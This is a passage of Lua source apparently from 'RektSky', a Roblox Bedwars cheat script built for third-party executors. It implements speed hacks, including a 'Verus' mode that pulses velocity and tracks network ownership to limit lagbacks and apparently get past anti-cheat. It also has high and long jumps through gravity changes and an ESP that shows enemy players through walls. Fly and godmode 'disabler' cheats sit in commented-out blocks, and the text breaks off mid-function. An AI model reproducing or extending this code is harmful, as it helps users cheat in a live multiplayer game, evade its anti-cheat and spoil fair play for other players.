-- MOVEMENT

function tpreal(t)
    for i,v in pairs(realchar:GetDescendants()) do
        if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
            v.Transparency = t
        elseif v:IsA("Decal") then
            v.Transparency = t
        end
    end
end

do
    local connectionnn
    local conectthing
    local longjumpenabled
    local floatdisab
    local speed
    local speedvalue = {["Value"] = 45}
    local speeddropdown = {["Value"] = "CFrame"}
    local speedvalueverus = {["Value"] = 80}
    local verusspeeddelay = {["Value"] = 0.5}
    local speedtog = Tabs["Movement"]:CreateToggle({
        ["Name"] = "Speed",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            local thing = v
            if thing then
                spawn(function()
                    if matchState == 0 then
                        createnotification("Speed", "Will enable speed when match started!", 4, true)
                    end
                end)
                repeat wait() 
                    if (not thing) then 
                        break 
                    end
                until (matchState == 1)
                if (not thing) then return end
                if speeddropdown["Value"] == "CFrame" then
                    if matchState == 1 then
                        spawn(function()
                            speed = 23
                            connectionnn = game:GetService("RunService").Heartbeat:connect(function()
                                local velo = lplr.Character.Humanoid.MoveDirection * speed
                                lplr.Character.HumanoidRootPart.Velocity = Vector3.new(velo.x, lplr.Character.HumanoidRootPart.Velocity.y, velo.z)
                            end)
                            conectthing = game:GetService("RunService").Stepped:connect(function(time, delta)
                                if entity.isAlive then
                                    if (not isnetworkowner(lplr.Character.HumanoidRootPart)) then
                                        lagbacked = true
                                    end
                                    if (isnetworkowner(lplr.Character.HumanoidRootPart)) then
                                        lagbacked = false
                                    end
                                    if speeddropdown["Value"] == "Verus" then conectthing:Disconnect() end
                                    if lplr.Character.Humanoid.MoveDirection.Magnitude > 0 and isnetworkowner(lplr.Character.HumanoidRootPart) then
                                        lplr.Character:TranslateBy(lplr.Character.Humanoid.MoveDirection * (lagbacked and speedvalue["Value"] * 3 or speedvalue["Value"] * 5.4) / 10 * delta)
                                    end
                                end
                                task.wait()
                            end)
                        end)
                    end
                elseif speeddropdown["Value"] == "Verus" then
                    pcall(function()
                        if conectthing then conectthing:Disconnect() end
                    end)
                    speedverus = 23
                    connectionnnverus = game:GetService("RunService").Heartbeat:connect(function()
                        local velo = lplr.Character.Humanoid.MoveDirection * speed
                        lplr.Character.HumanoidRootPart.Velocity = Vector3.new(velo.x, lplr.Character.HumanoidRootPart.Velocity.y, velo.z)
                    end)
                    if matchState == 1 then
                        repeat
                            if (not thing) then return end
                            if (speeddropdown["Value"] == "CFrame") then 
                                connectionnnverus:Disconnect()
                                return 
                            end
                            speed = 23
                            wait(0.4)
                            speed = speedvalueverus["Value"]
                            wait(verusspeeddelay["Value"])
                        until (not thing)
                    end
                end
            else
                if speeddropdown["Value"] == "CFrame" then
                    conectthing:Disconnect()
                    connectionnn:Disconnect()
                elseif speeddropdown["Value"] == "Verus" then
                    connectionnnverus:Disconnect()
                    return
                end
            end
        end
    })
    speedvalue = speedtog:CreateSlider({
        ["Name"] = "SpeedValue",
        ["Function"] = function() end,
        ["Min"] = 0,
        ["Max"] = 45,
        ["Default"] = 45,
        ["Round"] = 0
    })
    speeddropdown = speedtog:CreateDropDown({
        ["Name"] = "SpeedMode",
        ["Function"] = function() end,
        ["List"] = {"CFrame", "Verus"},
        ["Default"] = "CFrame"
    })
    speedvalueverus = speedtog:CreateSlider({
        ["Name"] = "VerusSpeed",
        ["Function"] = function() end,
        ["Min"] = 0,
        ["Max"] = 350,
        ["Default"] = 80,
        ["Round"] = 0
    })
    verusspeeddelay = speedtog:CreateSlider({
        ["Name"] = "VerusTicks",
        ["Function"] = function() end,
        ["Min"] = 0,
        ["Max"] = 1,
        ["Default"] = 0.5,
        ["Round"] = 1
    })
end

local sprint = false
Tabs["Movement"]:CreateToggle({
    ["Name"] = "Sprint",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        sprint = v
        if sprint then
            spawn(function()
                repeat
                    wait()
                    if (not sprint) then return end
                    if sprintthingy.sprinting == false then
                        sprintthingy:startSprinting()
                    end
                until (not sprint)
            end)
        else
            sprintthingy:stopSprinting()
        end
    end
})

do
    local highjump
    local highjumpforce = {["Value"] = 20}
    highjump = Tabs["Movement"]:CreateToggle({
        ["Name"] = "HighJump",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            local highjumpval = v
            if highjumpval then
                lplr.Character.Humanoid:ChangeState("Jumping")
                task.wait()
                workspace.Gravity = 5
                spawn(function()
                    for i = 1, highjumpforce["Value"] do
                        wait()
                        if (not highjumpval) then return end
                        lplr.Character.Humanoid:ChangeState("Jumping")
                    end
                end)
                spawn(function()
                    for i = 1, highjumpforce["Value"] / 28 do
                        task.wait(0.1)
                        lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
                        task.wait(0.1)
                        lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    end
                end)
                highjump:silentToggle()
            else
                workspace.Gravity = 196.19999694824
                return
            end
        end
    })
    highjumpforce = highjump:CreateSlider({
        ["Name"] = "Force",
        ["Function"] = function() end,
        ["Min"] = 0,
        ["Max"] = 50,
        ["Default"] = 25,
        ["Round"] = 0
    })
end

do
    local longjumpval = false
    local gravityval = {["Value"] = 0}
    local longjumpdelay = {["Value"] = 0.1}
    local LJSpeed = {["Value"] = 60}
    local oldthing
    local lognjump = Tabs["Movement"]:CreateToggle({
        ["Name"] = "LongJump",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            longjumpval = v
            if longjumpval then
                oldthing = oldthing or speedvalue["Value"]
                workspace.Gravity = gravityval["Value"]
                speedvalue["Value"] = LJSpeed["Value"]
            else
                workspace.Gravity = 196.19999694824
                speedvalue["Value"] = oldthing
                return
            end
        end
    })
    gravityval = lognjump:CreateSlider({
        ["Name"] = "Gravity",
        ["Function"] = function() end,
        ["Min"] = 0,
        ["Max"] = 10,
        ["Default"] = 0,
        ["Round"] = 0
    })
    longjumpdelay = lognjump:CreateSlider({
        ["Name"] = "Delay",
        ["Function"] = function() end,
        ["Min"] = 0,
        ["Max"] = 1,
        ["Default"] = 0.1,
        ["Round"] = 1
    })
    LJSpeed = lognjump:CreateSlider({
        ["Name"] = "Speed",
        ["Function"] = function() end,
        ["Min"] = 45,
        ["Max"] = 80,
        ["Default"] = 70,
        ["Round"] = 0
    })
end

--[[
    local customlongjumpval = false
    Tabs["Movement"]:CreateToggle({
        ["Name"] = "CustomLongJump",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            customlongjumpval = v
            if customlongjumpval then
                spawn(function()
                    repeat
                        if (not customlongjumpval) then return end
                        task.wait()
                        if lplr.Character.Humanoid.Jump == true then
                            if (not customlongjumpval) then return end
                            lplr.Character.Humanoid.WalkSpeed = 15
                            Workspace.Gravity = 23
                            lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame * CFrame.new(0,-0.2,-2.1) 
                            wait(0.1)
                            lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame * CFrame.new(0,-0.5,-2.1) 
                            wait(0.1)
                            lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0.2 ,0) 
                            wait(0.1)
                        end
                    until (not customlongjumpval)                
                end)
                spawn(function()
                    repeat
                        if (not customlongjumpval) then return end
                        lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
                        wait()
                        lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
                        wait()
                        lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
                        wait()
                    until (not customlongjumpval)
                end)
            else
                workspace.Gravity = 196.19999694824
                return
            end
        end
    })
]]

--[[
    local cloneval = false
    local funiclonegodmodedisab
    funiclonegodmodedisab = Tabs["Movement"]:CreateToggle({
        ["Name"] = "CloneGodmodeFullDisabler",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            cloneval = v
            if cloneval then
                spawn(function()
                    isclone = true
                    clonemake()
                    speedd = 200
                    connectionnnn = game:GetService("RunService").Heartbeat:connect(function()
                        local velo = clone.Humanoid.MoveDirection * speedd
                        clone.HumanoidRootPart.Velocity = Vector3.new(velo.x, lplr.Character.HumanoidRootPart.Velocity.y, velo.z)
                    end)
                end)
                repeat task.wait() until (matchState == 2)
                funiclonegodmodedisab:Toggle()
            else
                clone:remove()
                lplr.Character = realchar
                realchar.Humanoid:ChangeState("Dead")
                isclone = false
                connectionnnn:Disconnect()
                return
            end
        end
    })
--]]

--[[
    longjumpfuni = Tabs["Movement"]:CreateToggle({
        ["Name"] = "CannonLongJump",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            longjumpval = v
            if longjumpval then
                if game.Workspace.Map.Blocks:FindFirstChild("cannon") then
                    spawn(function()
                        repeat
                            for i,v in pairs(game.Workspace.Map.Blocks:GetChildren()) do
                                if v.Name == "cannon" then
                                    workspace.Gravity = 0
                                    v.LaunchSelfPrompt.HoldDuration = 0
                                    workspace.Gravity = 0
                                    fireproximityprompt(v.LaunchSelfPrompt)
                                    workspace.Gravity = 0
                                end
                            end
                        wait()
                        until (not longjumpval)   
                    end)
                    spawn(function()
                        workspace.Gravity = 0
                        wait(0.1)
                        workspace.Gravity = 0
                        wait(0.1)
                        workspace.Gravity = 0
                        wait(0.1)
                        workspace.Gravity = 0
                        wait(0.62)
                        workspace.Gravity = 196.19999694824
                    end)
                    spawn(function()
                        for i = 1, 4 do
                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
                            wait(0.1)
                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                        end
                    end)
                    longjumpfuni:silentToggle()
                end
            else
                workspace.Gravity = 196.19999694824
                return
            end
        end
    })
]]

--[[
    local flyenabled
    Tabs["Movement"]:CreateToggle({
        ["Name"] = "Fly",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            flyenabled = v
            if flyenabled then
                spawn(function()
                    repeat
                        task.wait()
                        if clone then
                            task.wait()
                            workspace.Gravity = 1
                            local SpaceHeld = uis:IsKeyDown(Enum.KeyCode.Space)
                            local ShiftHeld = uis:IsKeyDown(Enum.KeyCode.LeftShift)
                            if SpaceHeld then
                                clone.HumanoidRootPart.CFrame = clone.HumanoidRootPart.CFrame * CFrame.new(0, 15, 0)
                                task.wait()
                            end
                            if ShiftHeld then
                                clone.HumanoidRootPart.CFrame = clone.HumanoidRootPart.CFrame * CFrame.new(0, -15, 0)
                                task.wait()
                            end
                        else
                            task.wait()
                            workspace.Gravity = 1
                            local SpaceHeld = uis:IsKeyDown(Enum.KeyCode.Space)
                            local ShiftHeld = uis:IsKeyDown(Enum.KeyCode.LeftShift)
                            if SpaceHeld then
                                hrp.CFrame = hrp.CFrame * CFrame.new(0, 15, 0)
                                task.wait()
                            end
                            if ShiftHeld then
                                hrp.CFrame = hrp.CFrame * CFrame.new(0, -15, 0)
                                task.wait()
                            end
                        end
                    until (not flyenabled)
                end)
            else
                conectthingylol:Disconnect()
            end
        end
    })
]]

-- RENDER

function yesyesbed()
    if lplr.leaderstats.Bed.Value ~= "✅" then
        local sound = Instance.new("Sound")
        sound.Parent = workspace
        sound.SoundId = getasset("rektsky/sound/mc/bedbroken.mp3")
        sound:Play()
        wait(7)
        sound:remove()
    end
end

local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
    if tab.Method == "GET" then
        return {
            Body = game:HttpGet(tab.Url, true),
            Headers = {},
            StatusCode = 200
        }
    else
        return {
            Body = "bad exploit",
            Headers = {},
            StatusCode = 404
        }
    end
end 

local betterisfile = function(file)
    local suc, res = pcall(function() return readfile(file) end)
    return suc and res ~= nil
end

local cachedassets = {}
local function getcustomassetfunc(path)
    if not betterisfile(path) then
        spawn(function()
            local textlabel = Instance.new("TextLabel")
            textlabel.Size = UDim2.new(1, 0, 0, 36)
            textlabel.Text = "Downloading "..path
            textlabel.BackgroundTransparency = 1
            textlabel.TextStrokeTransparency = 0
            textlabel.TextSize = 30
            textlabel.Font = Enum.Font.SourceSans
            textlabel.TextColor3 = Color3.new(1, 1, 1)
            textlabel.Position = UDim2.new(0, 0, 0, -36)
            textlabel.Parent = ScreenGuitwo
            repeat wait() until betterisfile(path)
            textlabel:Remove()
        end)
        local req = requestfunc({
            Url = "https://raw.githubusercontent.com/8pmX8/rektsky4roblox/main/"..path:gsub("rektsky/sound/mc", "sound/mc"),
            Method = "GET"
        })
        writefile(path, req.Body)
    end
    if cachedassets[path] == nil then
        cachedassets[path] = getasset(path) 
    end
    return cachedassets[path]
end

local cachedassetssds = {}
local function getcustomassetthingylol(path)
    if not betterisfile(path) then
        spawn(function()
            local textlabel = Instance.new("TextLabel")
            textlabel.Size = UDim2.new(1, 0, 0, 36)
            textlabel.Text = "Downloading "..path
            textlabel.BackgroundTransparency = 1
            textlabel.TextStrokeTransparency = 0
            textlabel.TextSize = 30
            textlabel.Font = Enum.Font.SourceSans
            textlabel.TextColor3 = Color3.new(1, 1, 1)
            textlabel.Position = UDim2.new(0, 0, 0, -36)
            textlabel.Parent = ScreenGuitwo
            repeat wait() until betterisfile(path)
            textlabel:Remove()
        end)
        local req = requestfunc({
            Url = "https://raw.githubusercontent.com/8pmX8/rektsky4roblox/main/"..path:gsub("rektsky/assets", "assets"),
            Method = "GET"
        })
        writefile(path, req.Body)
    end
    if cachedassetssds[path] == nil then
        cachedassetssds[path] = getasset(path) 
    end
    return cachedassetssds[path]
end

local gamesound = require(game:GetService("ReplicatedStorage").TS.sound["game-sound"]).GameSound
Tabs["Render"]:CreateToggle({
    ["Name"] = "MCSounds",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        getgenv().mcsounds = v
        if getgenv().mcsounds then
            spawn(function()
                lplr.leaderstats.Bed:GetPropertyChangedSignal("Value"):Connect(yesyesbed)
            end)
            spawn(function()
                Client:WaitFor("BedwarsBedBreak"):andThen(function(p13)
                    p13:Connect(function(p14)
                        local sound = Instance.new("Sound")
                        sound.Parent = workspace
                        sound.SoundId = getcustomassetfunc("rektsky/sound/mc/bedbreak.mp3")
                        sound:Play()
                        wait(4)
                        sound:remove()
                    end)
                end)
            end)
            local oldsounds = gamesound
            local newsounds = gamesound
            newsounds.UI_CLICK = "rbxassetid://535716488"
            newsounds.PICKUP_ITEM_DROP = getcustomassetfunc("rektsky/sound/mc/pickup.mp3")
            newsounds.KILL = "rbxassetid://1053296915"
            newsounds.ERROR_NOTIFICATION = ""
            newsounds.DAMAGE_1 = "rbxassetid://6361963422"
            newsounds.DAMAGE = "rbxassetid://6361963422"
            newsounds.DAMAGE_2 = "rbxassetid://6361963422"
            newsounds.DAMAGE_3 = "rbxassetid://6361963422"
            newsounds.SWORD_SWING_1 = ""
            newsounds.SWORD_SWING_2 = ""
            newsounds.BEDWARS_PURCHASE_ITEM = getcustomassetfunc("rektsky/sound/mc/buyitem.mp3")
            newsounds.STATIC_HIT = "rbxassetid://6361963422"
            newsounds.STONE_BREAK = "rbxassetid://6496157434"
            newsounds.WOOL_BREAK = getcustomassetfunc("rektsky/sound/mc/woolbreak.mp3")
            newsounds.WOOD_BREAK = getcustomassetfunc("rektsky/sound/mc/breakwood.mp3")
            newsounds.GLASS_BREAK = getcustomassetfunc("rektsky/sound/mc/glassbreak.mp3")
            newsounds.TNT_HISS_1 = getcustomassetfunc("rektsky/sound/mc/tnthiss.mp3")
            newsounds.TNT_EXPLODE_1 = getcustomassetfunc("rektsky/sound/mc/tntexplode.mp3")
            gamesound = newsounds
        else
            gamesound = oldsounds
        end
    end
})

local function Cape(char, texture)
    for i,v in pairs(char:GetDescendants()) do
        if v.Name == "Cape" then
            v:Remove()
        end
    end
            local hum = char:WaitForChild("Humanoid")
            local torso = nil
            if hum.RigType == Enum.HumanoidRigType.R15 then
            torso = char:WaitForChild("UpperTorso")
            else
            torso = char:WaitForChild("Torso")
            end
            local p = Instance.new("Part", torso.Parent)
            p.Name = "Cape"
            p.Anchored = false
            p.CanCollide = false
            p.TopSurface = 0
            p.BottomSurface = 0
            p.FormFactor = "Custom"
            p.Size = Vector3.new(0.2,0.2,0.2)
            p.Transparency = 1
            local decal = Instance.new("Decal", p)
            decal.Texture = texture
            decal.Face = "Back"
            local msh = Instance.new("BlockMesh", p)
            msh.Scale = Vector3.new(9,17.5,0.5)
            local motor = Instance.new("Motor", p)
            motor.Part0 = p
            motor.Part1 = torso
            motor.MaxVelocity = 0.01
            motor.C0 = CFrame.new(0,2,0) * CFrame.Angles(0,math.rad(90),0)
            motor.C1 = CFrame.new(0,1,0.45) * CFrame.Angles(0,math.rad(90),0)
            local wave = false
            repeat wait(1/44)
                decal.Transparency = torso.Transparency
                local ang = 0.1
                local oldmag = torso.Velocity.magnitude
                local mv = 0.002
                if wave then
                    ang = ang + ((torso.Velocity.magnitude/10) * 0.05) + 0.05
                    wave = false
                else
                    wave = true
                end
                ang = ang + math.min(torso.Velocity.magnitude/11, 0.5)
                motor.MaxVelocity = math.min((torso.Velocity.magnitude/111), 0.04) --+ mv
                motor.DesiredAngle = -ang
                if motor.CurrentAngle < -0.2 and motor.DesiredAngle > -0.2 then
                    motor.MaxVelocity = 0.04
                end
                repeat wait() until motor.CurrentAngle == motor.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag) >= (torso.Velocity.magnitude/10) + 1
                if torso.Velocity.magnitude < 0.1 then
                    wait(0.1)
                end
            until not p or p.Parent ~= torso.Parent
end

Tabs["Render"]:CreateToggle({
    ["Name"] = "Cape",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if v and entity.isAlive then
            Cape(game.Players.LocalPlayer.Character, getcustomassetthingylol("rektsky/cape.png"))
        else
            Cape(game.Players.LocalPlayer.Character, nil)
        end
    end
})

local colorbox
local function makeRainbowText(text)
    spawn(function()
        colorbox = Color3.fromRGB(170,0,170)
        local x = 0
        while wait() do
            colorbox = Color3.fromHSV(x,1,1)
            x = x + 4.5/255
            if x >= 1 then
                x = 0
            end
        end
    end)
    spawn(function()
        repeat
            wait()
            text.TextColor3 = colorbox
        until true == false
    end)
end

local function makeRainbowFrame(frame)
    spawn(function()
        repeat
            wait()
            frame.BackgroundColor3 = colorbox
        until true == false
    end)
end

local ESPFolder
Tabs["Render"]:CreateToggle({
    ["Name"] = "ESP",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        local thing
        local espval = v
        if espval then
            spawn(function()
                ESPFolder = Instance.new("Folder")
                ESPFolder.Name = "ESPFolder"
                ESPFolder.Parent = ScreenGuitwo
                repeat
                    task.wait()
                    if (not espval) then break end
                    for i,plr in pairs(game.Players:GetChildren()) do
                        if ESPFolder:FindFirstChild(plr.Name) then
                            thing = ESPFolder[plr.Name]
                            thing.Visible = false
                        else
                            thing = Instance.new("ImageLabel")
                            thing.BackgroundTransparency = 1
                            thing.BorderSizePixel = 0
                            thing.Image = getcustomassetthingylol("rektsky/assets/esppic.png")
                            thing.Visible = false
                            thing.Name = plr.Name
                            thing.Parent = ESPFolder
                            thing.Size = UDim2.new(0, 256, 0, 256)
                        end
                        
                        if isAlive(plr) and plr ~= lplr and plr.Team ~= tostring(lplr.Team) then
                            local rootPos, rootVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                            local rootSize = (plr.Character.HumanoidRootPart.Size.X * 1200) * (cam.ViewportSize.X / 1920)
                            local headPos, headVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position + Vector3.new(0, 1 + (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and 2 or plr.Character.Humanoid.HipHeight), 0))
                            local legPos, legVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position - Vector3.new(0, 1 + (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and 2 or plr.Character.Humanoid.HipHeight), 0))
                            rootPos = rootPos
                            if rootVis then
                                thing.Visible = rootVis
                                thing.Size = UDim2.new(0, rootSize / rootPos.Z, 0, headPos.Y - legPos.Y)
                                thing.Position = UDim2.new(0, rootPos.X - thing.Size.X.Offset / 2, 0, (rootPos.Y - thing.Size.Y.Offset / 2) - 36)
                            end
                        end
                    end
                until (not espval)
            end)
            game.Players.PlayerRemoving:connect(function(plr)
                if ESPFolder:FindFirstChild(plr.Name) then
                    ESPFolder[plr.Name]:Remove()
                end
            end)
        else
            ESPFolder:remove()
            return
        end
    end
})

local screngiu
Tabs["Render"]:CreateToggle({
    ["Name"] = "WaterMarks",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if entity.isAlive then
            if v then
                screngiu = Instance.new("ScreenGui")
                local Frame = Instance.new("Frame")
                local UICorner = Instance.new("UICorner")
                local ImageLabel = Instance.new("ImageLabel")
                local TextLabel = Instance.new("TextLabel")
                screngiu.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
                screngiu.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                Frame.Parent = screngiu
                Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                Frame.BackgroundTransparency = 0.400
                Frame.Position = UDim2.new(0.0163636357, 0, 0.0343558267, 0)
                Frame.Size = UDim2.new(0, 149, 0, 149)
                UICorner.CornerRadius = UDim.new(0, 9)
                UICorner.Parent = Frame
                ImageLabel.Parent = Frame
                ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                ImageLabel.BackgroundTransparency = 1.000
                ImageLabel.Position = UDim2.new(0.137143791, 0, 0.0700296983, 0)
                ImageLabel.Size = UDim2.new(0, 108, 0, 108)
                ImageLabel.Image = getcustomassetthingylol("rektsky/assets/icon.png")
                TextLabel.Parent = Frame
                TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                TextLabel.BackgroundTransparency = 1.000
                TextLabel.BorderSizePixel = 0
                TextLabel.Position = UDim2.new(0.0402684584, 0, 0.798657715, 0)
                TextLabel.Size = UDim2.new(0, 132, 0, 30)
                TextLabel.Font = Enum.Font.SourceSansLight
                TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                TextLabel.TextScaled = true
                TextLabel.TextSize = 14.000
                TextLabel.TextWrapped = true
                TextLabel.Text = "RektSky B4 Public"
                makeRainbowText(TextLabel, true)
            else
                makeRainbowText(TextLabel, false)
                screngiu:Destroy()
                return
            end
        end
    end
})

--[[
local ScreenGuie
Tabs["Render"]:CreateToggle({
    ["Name"] = "KeyStrokes",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        local keystrokesval = v
        if keystrokesval then
            local ScreenGuie = Instance.new("ScreenGui")
            local WKey = Instance.new("Frame")
            local UICorner = Instance.new("UICorner")
            local TextLabel = Instance.new("TextLabel")
            local SKey = Instance.new("Frame")
            local UICorner_2 = Instance.new("UICorner")
            local TextLabel_2 = Instance.new("TextLabel")
            local AKey = Instance.new("Frame")
            local UICorner_3 = Instance.new("UICorner")
            local TextLabel_3 = Instance.new("TextLabel")
            local DKey = Instance.new("Frame")
            local UICorner_4 = Instance.new("UICorner")
            local TextLabel_4 = Instance.new("TextLabel")
            local LMB = Instance.new("Frame")
            local UICorner_5 = Instance.new("UICorner")
            local TextLabel_5 = Instance.new("TextLabel")
            local RMB = Instance.new("Frame")
            local UICorner_6 = Instance.new("UICorner")
            local TextLabel_6 = Instance.new("TextLabel")
            
            --Properties:
            
            ScreenGuie.Parent = game.CoreGui
            
            WKey.Name = "WKey"
            WKey.Parent = ScreenGuie
            WKey.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            WKey.BackgroundTransparency = 0.300
            WKey.Position = UDim2.new(0.0412545539, 0, 0.218990266, 0)
            WKey.Size = UDim2.new(0, 58, 0, 56)
            
            UICorner.CornerRadius = UDim.new(0, 9)
            UICorner.Parent = WKey
            
            TextLabel.Parent = WKey
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.BorderSizePixel = 0
            TextLabel.Position = UDim2.new(7.82310963e-08, 0, 9.87201929e-08, 0)
            TextLabel.Size = UDim2.new(0, 58, 0, 56)
            TextLabel.Font = Enum.Font.SourceSansLight
            TextLabel.Text = "W"
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextSize = 30.000
            
            SKey.Name = "SKey"
            SKey.Parent = ScreenGuie
            SKey.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            SKey.BackgroundTransparency = 0.300
            SKey.Position = UDim2.new(0.0408016965, 0, 0.301259696, 0)
            SKey.Selectable = true
            SKey.Size = UDim2.new(0, 61, 0, 56)
            
            UICorner_2.CornerRadius = UDim.new(0, 9)
            UICorner_2.Parent = SKey
            
            TextLabel_2.Parent = SKey
            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.BackgroundTransparency = 1.000
            TextLabel_2.BorderSizePixel = 0
            TextLabel_2.Position = UDim2.new(0.0409834981, 0, -2.38418579e-07, 0)
            TextLabel_2.Size = UDim2.new(0, 58, 0, 56)
            TextLabel_2.Font = Enum.Font.SourceSansLight
            TextLabel_2.Text = "S"
            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.TextSize = 30.000
            
            AKey.Name = "AKey"
            AKey.Parent = ScreenGuie
            AKey.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            AKey.BackgroundTransparency = 0.300
            AKey.Position = UDim2.new(0.0046426258, 0, 0.301259696, 0)
            AKey.Selectable = true
            AKey.Size = UDim2.new(0, 58, 0, 56)
            
            UICorner_3.CornerRadius = UDim.new(0, 9)
            UICorner_3.Parent = AKey
            
            TextLabel_3.Parent = AKey
            TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.BackgroundTransparency = 1.000
            TextLabel_3.BorderSizePixel = 0
            TextLabel_3.Size = UDim2.new(0, 58, 0, 56)
            TextLabel_3.Font = Enum.Font.SourceSansLight
            TextLabel_3.Text = "A"
            TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_3.TextSize = 30.000
            
            DKey.Name = "DKey"
            DKey.Parent = ScreenGuie
            DKey.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            DKey.BackgroundTransparency = 0.300
            DKey.Position = UDim2.new(0.0777207837, 0, 0.301259696, 0)
            DKey.Selectable = true
            DKey.Size = UDim2.new(0, 58, 0, 56)
            
            UICorner_4.CornerRadius = UDim.new(0, 9)
            UICorner_4.Parent = DKey
            
            TextLabel_4.Parent = DKey
            TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_4.BackgroundTransparency = 1.000
            TextLabel_4.BorderSizePixel = 0
            TextLabel_4.Position = UDim2.new(-1.1920929e-07, 0, 0, 0)
            TextLabel_4.Size = UDim2.new(0, 58, 0, 56)
            TextLabel_4.Font = Enum.Font.SourceSansLight
            TextLabel_4.Text = "D"
            TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_4.TextSize = 30.000
            
            LMB.Name = "LMB"
            LMB.Parent = ScreenGuie
            LMB.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            LMB.BackgroundTransparency = 0.300
            LMB.Position = UDim2.new(0.00477237254, 0, 0.386007428, 0)
            LMB.Selectable = true
            LMB.Size = UDim2.new(0, 90, 0, 56)
            
            UICorner_5.CornerRadius = UDim.new(0, 9)
            UICorner_5.Parent = LMB
            
            TextLabel_5.Parent = LMB
            TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_5.BackgroundTransparency = 1.000
            TextLabel_5.BorderSizePixel = 0
            TextLabel_5.Position = UDim2.new(0.174026534, 0, 0, 0)
            TextLabel_5.Size = UDim2.new(0, 58, 0, 56)
            TextLabel_5.Font = Enum.Font.SourceSansLight
            TextLabel_5.Text = "LMB"
            TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_5.TextSize = 30.000
            
            RMB.Name = "RMB"
            RMB.Parent = ScreenGuie
            RMB.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            RMB.BackgroundTransparency = 0.300
            RMB.Position = UDim2.new(0.062555559, 0, 0.386007428, 0)
            RMB.Selectable = true
            RMB.Size = UDim2.new(0, 87, 0, 56)
            
            UICorner_6.CornerRadius = UDim.new(0, 9)
            UICorner_6.Parent = RMB
            
            TextLabel_6.Parent = RMB
            TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_6.BackgroundTransparency = 1.000
            TextLabel_6.BorderSizePixel = 0
            TextLabel_6.Position = UDim2.new(0.163681686, 0, 0, 0)
            TextLabel_6.Size = UDim2.new(0, 58, 0, 56)
            TextLabel_6.Font = Enum.Font.SourceSansLight
            TextLabel_6.Text = "RMB"
            TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_6.TextSize = 30.000
            spawn(function()
                repeat
                    wait()
                    if uis:IsKeyDown(Enum.KeyCode.A) then
                        AKey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
                    else
                        AKey.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                        TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
                    end
                    if uis:IsKeyDown(Enum.KeyCode.D) then
                        DKey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
                    else
                        DKey.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                        TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
                    end
                    if uis:IsKeyDown(Enum.KeyCode.W) then
                        WKey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
                    else
